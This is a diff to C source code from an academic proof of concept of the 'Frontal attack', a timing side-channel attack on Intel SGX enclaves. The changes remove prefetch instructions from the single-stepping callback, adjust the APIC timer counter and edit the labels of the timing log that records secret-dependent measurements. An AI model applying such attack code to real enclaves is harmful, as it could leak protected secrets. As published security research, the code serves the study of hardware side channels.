@@ -2,8 +2,8 @@
  *  This file is part of the Frontal attack PoC.
  *
  *  Copyright (C) 2020 Ivan Puddu <ivan.puddu@inf.ethz.ch>,
- *                     Miro Haller <miro.haller@alumni.ethz.ch>
- *                     Moritz Schneider <moritz.schneider@inf.ethz.ch>,
+ *                     Miro Haller <miro.haller@alumni.ethz.ch>,
+ *                     Moritz Schneider <moritz.schneider@inf.ethz.ch>
  *
  *  The Frontal attack PoC is free software: you can redistribute it
  *  and/or modify it under the terms of the GNU General Public License
@@ -193,20 +193,6 @@ uint64_t aep_cb_func(void) {
         */
         *pte_encl = MARK_NOT_ACCESSED(*pte_encl);
 
-        __asm__ __volatile__(
-            "prefetcht0 sgx_step_aep_trampoline(%%rip)\n\t"
-            :::
-        );
-
-        // Make sure currently used page is prefetched
-        // (usually this is the case anyways)
-        // Note: Prefetching next page is a bad idea, since this sometimes
-        // evicts data used by the enclave which creates double peaks.
-        __asm__ __volatile__(
-            "prefetcht0 pte_encl(%%rip)\n\t"
-            :::
-        );
-
         // The value returned by this function will be set as the APIC counter
         return base_sgx_step_counter;
     }
@@ -268,7 +254,8 @@ void attacker_config_runtime(void)
     set_tcs_dbflag(1);
     // Note: setting the DEBUG flag makes EENTRY and EAX faster, so we need
     // to adjust the base SGX_STEP counter accordingly
-    base_sgx_step_counter -= (APIC_TDR_DIV_SET == APIC_TDR_DIV_1) ? 2 : 1;
+    //base_sgx_step_counter -= (APIC_TDR_DIV_SET == APIC_TDR_DIV_1) ? 2 : 1;
+    base_sgx_step_counter -= 1;
     ASSERT( base_sgx_step_counter );
     #endif
 
@@ -363,7 +350,7 @@ int log_timing_results(uint8_t *secret_arr, int secret_size) {
 
     info("saving the measurements to %s:", fname);
     FILE *fp = fopen(fname, "w");
-    fprintf(fp, "Test name: secret_branch\n");
+    fprintf(fp, "Test name addition: secret_branch\n");
     fprintf(fp, "All instructions timing. Scenario: %d.", ATTACK_SCENARIO);
 
     #if PCM_ENABLED
@@ -374,12 +361,8 @@ int log_timing_results(uint8_t *secret_arr, int secret_size) {
     fprintf(fp, ")");
     #endif
 
-    fprintf(fp, "\n", NUM_RUNS);
+    fprintf(fp, "\n");
     fprintf(fp, "cycles, secret");
-
-    #if (ATTACK_SCENARIO == IPP_LIB)
-    fprintf(fp, "b1, secretb2");
-    #endif
 
     #if PCM_ENABLED
     for (i = 0; i < NUM_PCMS; i++) {
